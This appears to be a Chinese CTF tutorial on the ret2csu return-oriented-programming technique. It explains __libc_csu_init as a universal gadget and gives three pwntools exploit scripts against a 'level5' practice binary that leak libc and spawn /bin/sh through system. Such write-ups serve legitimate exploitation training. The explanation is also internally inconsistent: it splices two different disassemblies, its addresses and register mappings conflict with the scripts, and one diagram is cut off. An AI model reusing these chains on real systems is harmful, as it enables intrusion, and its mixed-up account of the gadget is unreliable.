## 1. 前置知识：64位程序调用约定

在 64 位 Linux 程序中，函数调用使用 **寄存器传参** 而非栈传参。当函数参数少于 7 个时，参数从左到右依次放入以下寄存器：

| 参数顺序 | 寄存器 |
|:--------:|:------:|
| 第 1 个参数 | `rdi` |
| 第 2 个参数 | `rsi` |
| 第 3 个参数 | `rdx` |
| 第 4 个参数 | `rcx` |
| 第 5 个参数 | `r8` |
| 第 6 个参数 | `r9` |

因此，在 ROP 攻击中，我们需要找到能控制这些寄存器的 **gadget**（以 `ret` 结尾的指令片段）来构造调用链。

---

## 2. 问题引入：缺少控制 rdx 的 gadget

在大部分情况下，我们可以在程序中找到以下带有 `pop` 的 gadget：

```
0x00000000004006fc: pop r12; pop r13; pop r14; pop r15; ret;
0x00000000004006fe: pop r13; pop r14; pop r15; ret;
0x0000000000400700: pop r14; pop r15; ret;
0x0000000000400702: pop r15; ret;
0x000000000040057f: pop rbp; mov edi, 0x601048; jmp rax;
0x00000000004006fb: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x00000000004006ff: pop rbp; pop r14; pop r15; ret;
0x0000000000400590: pop rbp; ret;
0x0000000000400703: pop rdi; ret;
0x0000000000400701: pop rsi; pop r15; ret;
0x00000000004006fd: pop rsp; pop r13; pop r14; pop r15; ret;
```

**关键问题**：在这些 gadget 中，可以很明显地看出来 **没有可以控制 `rdx` 寄存器的 gadget**。

这就意味着，如果目标函数（如 `read`、`write`）需要用到第三个参数（通过 `rdx` 传递），我们无法直接通过常规 gadget 来控制它。

**解决方案**：引入 **ret2csu** 攻击手法。

---

## 3. ret2csu 概述

所谓 **ret2csu**，就是指利用 glibc 编译出的程序中普遍存在的一个函数：

```
__libc_csu_init
```

来当作 **万能 gadget**，从而控制函数的参数。

### 为什么 ret2csu 有效？

- `__libc_csu_init` 是 glibc 编译程序时自动链接进去的初始化函数，**几乎所有使用 glibc 的 ELF 程序都会包含它**。
- 该函数内部包含一系列 `pop` 和 `mov` 指令，可以间接控制 `rdi`、`rsi`、`rdx` 三个关键寄存器。
- 它不依赖程序自身的代码，因此 **不受 PIE（位置无关可执行文件）影响**（在非 PIE 程序中地址固定）。

## 4. \_\_libc\_csu\_init 函数分析

`__libc_csu_init` 这个函数是用来对 libc 进行初始化操作的。其汇编代码大体如下（不同编译器会产生不同的具体函数内容）：

### 汇编代码

```asm
; === 第一部分：初始化循环 ===
.text:00000000004006C1    sub     rbp, r12
.text:00000000004006C4    sub     rsp, 8
.text:00000000004006C8    sar     rbp, 3
.text:00000000004006CC    call    _init_proc
.text:00000000004006D1    test    rbp, rbp
.text:00000000004006D4    jz      short loc_4006F6
.text:00000000004006D6    xor     ebx, ebx
.text:00000000004006D8    nop     dword ptr [rax+rax+00000000h]

; === 循环体：调用 init 函数数组 ===
loc_4006E0:
.text:00000000004006E0    mov     rdx, r13        ; rdx = r13（第三个参数）
.text:00000000004006E3    mov     rsi, r14        ; rsi = r14（第二个参数）
.text:00000000004006E6    mov     edi, r15d       ; edi = r15d（第一个参数，32位）
.text:00000000004006E9    call    qword ptr [r12+rbx*8]  ; 调用函数指针
.text:00000000004006ED    add     rbx, 1          ; rbx++
.text:00000000004006F1    cmp     rbx, rbp        ; 比较 rbx 和 rbp
.text:00000000004006F4    jnz     short loc_4006E0  ; 不相等则继续循环

; === 第二部分：清理并返回 ===
loc_4006F6:
.text:00000000004006F6    add     rsp, 8
.text:00000000004006FA    pop     rbx             ; pop rbx
.text:00000000004006FB    pop     rbp             ; pop rbp
.text:00000000004006FC    pop     r12             ; pop r12
.text:00000000004006FE    pop     r13             ; pop r13
.text:0000000000400700    pop     r14             ; pop r14
.text:0000000000400702    pop     r15             ; pop r15
.text:0000000000400704    retn

; === 第三部分：循环中的关键赋值 ===
loc_4005F0:
.text:00000000004005F0    mov     rdx, r15        ; rdx = r15
.text:00000000004005F3    mov     rsi, r14        ; rsi = r14
.text:00000000004005F6    mov     edi, r13d       ; edi = r13d
.text:00000000004005F9    call    qword ptr [r12+rbx*8]
.text:00000000004005FD    add     rbx, 1
.text:0000000000400601    cmp     rbx, rbp
.text:0000000000400604    jnz     short loc_4005F0

loc_400606:
.text:0000000000400606    mov     rbx, [rsp+38h+var_30]
.text:000000000040060B    mov     rbp, [rsp+38h+var_28]
.text:0000000000400610    mov     r12, [rsp+38h+var_20]
.text:0000000000400615    mov     r13, [rsp+38h+var_18]
.text:000000000040061A    mov     r14, [rsp+38h+var_10]
.text:000000000040061F    mov     r15, [rsp+38h+var_8]
.text:0000000000400624    add     rsp, 38h
.text:0000000000400628    retn
```

### 关键指令总结

| 地址 | 指令 | 作用 |
|:----:|:----:|:----:|
| `0x4006E0` | `mov rdx, r13` | 将 r13 的值赋给 rdx |
| `0x4006E3` | `mov rsi, r14` | 将 r14 的值赋给 rsi |
| `0x4006E6` | `mov edi, r15d` | 将 r15 的低32位赋给 edi（rdi） |
| `0x4006E9` | `call [r12+rbx*8]` | 调用函数指针（r12 + rbx*8 指向的地址） |
| `0x4006FA~0x400704` | `pop rbx/rbp/r12~r15; ret` | 弹出栈值到各寄存器 |

## 5. 利用原理（六步法）

### 整体思路

通过精心布置栈上的数据，利用 `__libc_csu_init` 中的两段关键代码，实现对 `rdi`、`rsi`、`rdx` 三个寄存器的控制，并调用任意函数。

### 详细步骤

#### 第一步：设置返回地址为 `0x4006F6`，同时在栈上布置数据

将返回地址设置为 `0x4006F6`（即 `add rsp, 8` 的位置），同时在栈上按照 `pop` 的顺序布置数据：

```
pop rbx  →  数据1
pop rbp  →  数据2
pop r12  →  数据3
pop r13  →  数据4
pop r14  →  数据5
pop r15  →  数据6
ret      →  下一步返回地址
```

#### 第二步：控制 `rbx=0`，`rbp=1`

- `rbx = 0`：确保 `r12 + rbx*8 = r12`，即调用 `r12` 指向的函数。
- `rbp = 1`：使得 `cmp rbx, rbp` 在第一次循环后 `rbx=1 == rbp=1`，循环只执行一次就退出（`jnz` 不跳转）。

#### 第三步：`r12` 为写入了目标函数地址的内存地址

`r12` 需要指向一个存储了目标函数地址的内存位置（如 GOT 表项）。因为 `call qword ptr [r12+rbx*8]` 是 **间接调用**，所以 `r12` 的值应该是 **指向函数地址的指针**，而非函数地址本身。

#### 第四步：`r15`、`r14`、`r13` 分别为 `rdi`、`rsi`、`rdx`

通过 `pop` 指令将参数值弹入寄存器：

- `r15` → 通过 `mov edi, r15d` 赋给 `rdi`（第1个参数）
- `r14` → 通过 `mov rsi, r14` 赋给 `rsi`（第2个参数）
- `r13` → 通过 `mov rdx, r13` 赋给 `rdx`（第3个参数）

#### 第五步：将返回地址设置为 `0x4006E0`

`0x4006E0` 是循环体的起始位置（`mov rdx, r13`），执行到这里会完成寄存器赋值并调用目标函数。

#### 第六步：继续布置栈，跳过下方的 `pop` 控制返回地址

函数调用返回后，会继续执行 `0x4006F6` 处的 `add rsp, 8` 和后续的 `pop` 指令。需要布置足够的填充数据来跳过这些 `pop`，最终将返回地址控制为我们想要的下一个 ROP 链地址。

### 栈布局示意图

```
高地址
┌─────────────────────────────────────────────
│  返回地址: 0x4006F6 (csu_start)              │ ← 第一步
├─────────────────────────────────────────────┤
│  填充: 0x38 字节 (跳过局部变量区域)           │
├─────────────────────────────────────────────┤
│  pop rbx  ← rbx = 0                         │ ← 第二步
├─────────────────────────────────────────────┤
│  pop rbp  ← rbp = 1                         │ ← 第二步
├─────────────────────────────────────────────
│  pop r12  ← 目标函数GOT地址                  │ ← 第三步
├─────────────────────────────────────────────┤
│  pop r13  ← rdx 参数值                       │ ← 第四步
├─────────────────────────────────────────────┤
│  pop r14  ← rsi 参数值                       │ ← 第四步
├─────────────────────────────────────────────┤
│  pop r15  ← rdi 参数值                       │ ← 第四步
─────────────────────────────────────────────┤
│  返回地址: 0x4005F0 (csu_exec)               │ ← 第五步
├─────────────────────────────────────────────
│  填充: 0x38 字节 (跳过 pop 指令)              │ ← 第六步
├─────────────────────────────────────────────┤
│  下一个 ROP 链 / 返回地址                     │
└─────────────────────────────────────────────
低地址
```

## 6. 实战：level5 完整 Exploit

### 6.1 基础版 Exploit（泄露 libc 地址）

```python
from pwn import *

s = process("./level5")
elf = ELF("./level5")

def csu(rdi, rsi, rdx, func):
    payload = p64(0x400606)
    payload += 'A' * 8 + p64(0) + p64(1) + p64(func) + p64(rdi) + p64(rsi) + p64(rdx)
    payload += p64(0x4005F0)
    payload += 'A' * 0x38
    return payload

gdb.attach(s, "b *0x400563\n")
payload = 'A' * 0x80 + p64(0) + csu(1, elf.got['write'], 8, elf.got['write'])
s.send(payload)

libc = ELF("./libc-2.31.so")
libc.address = u64(s.recvuntil("\x7f")[-6:] + "\x00\x00") - libc.sym['write']
success(hex(libc.address))

s.interactive()
```

### 6.2 进阶版 Exploit（写入 /bin/sh 并调用 system）

```python
from pwn import *

s = process("./level5")
elf = ELF("./level5")

def csu(rdi, rsi, rdx, func):
    payload = p64(0x400606)
    payload += 'A' * 8 + p64(0) + p64(1) + p64(func) + p64(rdi) + p64(rsi) + p64(rdx)
    payload += p64(0x4005F0)
    payload += 'A' * 0x38
    return payload

gdb.attach(s, "b *0x400563\n")

# 第一步：用 write 泄露 libc 地址
payload = 'A' * 0x80 + p64(0) + csu(1, elf.got['write'], 8, elf.got['write'])
# 第二步：用 read 将 "/bin/sh\x00" 写入 BSS 段
payload += csu(0, elf.bss(0x500), 0x100, elf.got['read'])
# 第三步：用 system 执行 "/bin/sh"
payload += csu(elf.bss(0x500) + 8, 0, 0, elf.bss(0x500))[:-8]
s.send(payload)

libc = ELF("./libc-2.31.so")
libc.address = u64(s.recvuntil("\x7f")[-6:] + "\x00\x00") - libc.sym['write']
success(hex(libc.address))

raw_input(">")
payload = p64(libc.sym['system']) + "/bin/sh\x00"
s.send(payload)

s.interactive()
```

### 6.3 最终优化版 Exploit

```python
from pwn import *

s = process("./level5")
elf = ELF("./level5")

def csu(rdi, rsi, rdx, func):
    payload = 'A' * 8 + p64(0) + p64(1) + p64(func) + p64(rdi) + p64(rsi) + p64(rdx)
    return payload

csu_start = 0x400606
csu_exec = 0x4005F0

gdb.attach(s, "b *0x400563\n")

payload = 'A' * 0x80 + p64(0)
# 第一次 csu 调用：write 泄露
payload += p64(csu_start) + csu(1, elf.got['write'], 8, elf.got['write']) + p64(csu_exec)
# 第二次 csu 调用：read 写入 BSS
payload += csu(0, elf.bss(0x500), 0x100, elf.got['read']) + p64(csu_exec)
# 第三次 csu 调用：system("/bin/sh")
payload += csu(elf.bss(0x500) + 8, 0, 0, elf.bss(0x500)) + p64(csu_exec)
s.send(payload)

libc = ELF("./libc-2.31.so")
libc.address = u64(s.recvuntil("\x7f")[-6:] + "\x00\x00") - libc.sym['write']
success(hex(libc.address))

raw_input(">")
payload = p64(libc.sym['system']) + "/bin/sh\x00"
s.send(payload)

s.interactive()
```

```
┌──────────────────────────────────────────────────────────────┐
│  阶段一：泄露 libc 地址                                        │
│  write(1, got['write'], 8) → 泄露 write 的真实地址             │

```

## 7. 总结与注意事项

### 核心要点

1. **ret2csu 的适用场景**：64 位程序中找不到控制 `rdx` 寄存器的 gadget 时，利用 `__libc_csu_init` 函数作为万能 gadget。

2. **两个关键地址**：
   - `csu_start`（`0x400606`）：从 `mov` 指令开始，完成寄存器赋值和函数调用。
   - `csu_exec`（`0x4005F0`）：循环体起始位置，执行实际的寄存器赋值和 `call`。

3. **间接调用机制**：`call qword ptr [r12+rbx*8]` 是间接调用，`r12` 必须指向存储函数地址的内存位置（如 GOT 表），而非函数地址本身。

4. **循环控制**：通过设置 `rbx=0`、`rbp=1`，确保循环只执行一次。

5. **栈对齐**：`add rsp, 8` 和后续的 `pop` 指令需要足够的填充数据（通常 `0x38` 字节）来跳过。

### 注意事项

- 不同编译器/链接器版本生成的 `__libc_csu_init` 汇编代码可能略有差异，需要根据实际二进制文件分析。
- 如果程序开启了 PIE，`__libc_csu_init` 的地址会发生变化，需要先泄露基址。
- `mov edi, r15d` 只使用了 `r15` 的低 32 位，因此 `rdi` 的高 32 位会被清零。对于大多数场景这不影响使用。
- 在构造多次 csu 调用链时，注意每次调用后栈指针的变化，确保后续调用链的正确性。
